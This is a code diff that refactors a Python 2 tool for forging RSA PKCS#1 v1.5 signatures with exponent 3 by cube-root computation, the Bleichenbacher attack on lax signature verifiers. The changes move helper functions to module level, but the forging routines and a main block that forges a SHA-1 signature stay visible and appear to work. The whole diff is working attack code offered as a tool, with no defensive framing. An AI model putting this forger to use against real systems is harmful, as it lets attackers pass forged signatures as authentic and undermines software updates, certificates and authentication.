@@ -37,6 +37,21 @@ class Hash:
 			self.digester = hashlib.sha512
 		else:
 			raise Exception("Invalid hash algorithm identifier provided")
+	
+def getBitAt(idx, val):
+  return (val >> idx) & 0x01
+
+def setBitAt(idx, val):
+  return val | (0x01 << idx)
+
+def toInt(val):
+  return int(val.encode("hex"), 16)
+
+def toBytes(val):
+  hexVal = hex(val)[2:-1]
+  if len(hexVal) % 2 == 1:
+    hexVal = "0"+hexVal
+  return hexVal.decode("hex")
 
 class SignatureForger:
 
@@ -45,20 +60,6 @@ class SignatureForger:
 		self.hashAlg = hashAlg
 		self.method = method
 
-	def getBitAt(self, idx, val):
-		return (val >> idx) & 0x01
-
-	def setBitAt(self, idx, val):
-		return val | (0x01 << idx)
-
-	def toInt(self, val):
-		return int(val.encode("hex"), 16)
-
-	def toBytes(self, val):
-		hexVal = hex(val)[2:-1]
-		if len(hexVal) % 2 == 1:
-			hexVal = "0"+hexVal
-		return hexVal.decode("hex")
 
 	def encodePkcs1Suffix(self, message):
 		messageHash = self.hashAlg.digester(message).digest()
@@ -71,8 +72,8 @@ class SignatureForger:
 	def constructSignatureSuffix(self, suffix):
 		signatureSuffix = 1
 		for idx in range(len(suffix) * 8):
-			if self.getBitAt(idx, signatureSuffix ** 3) != self.getBitAt(idx, self.toInt(suffix)):
-				signatureSuffix = self.setBitAt(idx, signatureSuffix)
+			if getBitAt(idx, signatureSuffix ** 3) != getBitAt(idx, toInt(suffix)):
+				signatureSuffix = setBitAt(idx, signatureSuffix)
 		return signatureSuffix
 
 	def addPrefixToSignature(self, signatureSuffix):
@@ -80,9 +81,9 @@ class SignatureForger:
 		prefix += "\xFF"*8
 		while True:
 			testPrefix = prefix + os.urandom((self.keysize/8) - (len(prefix)))
-			signatureCandidate = self.toBytes(int(gmpy2.cbrt(self.toInt(testPrefix))))[:-len(self.toBytes(signatureSuffix))] + self.toBytes(signatureSuffix)
-			toCheck = self.toBytes(self.toInt(signatureCandidate) ** 3)
-			if "\x00" not in toCheck[:-len(self.toBytes(signatureSuffix))]:
+			signatureCandidate = toBytes(int(gmpy2.cbrt(toInt(testPrefix))))[:-len(toBytes(signatureSuffix))] + toBytes(signatureSuffix)
+			toCheck = toBytes(toInt(signatureCandidate) ** 3)
+			if "\x00" not in toCheck[:-len(toBytes(signatureSuffix))]:
 				return signatureCandidate
 
 
@@ -110,7 +111,7 @@ class SignatureForger:
 		prefix += "\xFF"*psLength
 		suffix = self.encodePkcs1Suffix(message)
 		plain = prefix + suffix + "\x00"*((self.keysize/8)-(len(prefix) + len(suffix)))
-		signature = self.toBytes(int(self.nthroot(3, self.toInt(plain)))+1)
+		signature = toBytes(int(self.nthroot(3, toInt(plain)))+1)
 		return signature
 
 if __name__ == "__main__":
@@ -118,7 +119,7 @@ if __name__ == "__main__":
 	signatureForger = SignatureForger(2048, Hash("SHA-1"), 1)
 	#signature = signatureForger.forgeSignature_method1(message)
 	signature = signatureForger.forgeSignature_method2(message)
-	print(hex(signatureForger.toInt(signature) ** 3))
+	print(hex(toInt(signature) ** 3))
 	'''
 	output format: raw, hex, base64
 	keysize: raw, from public key
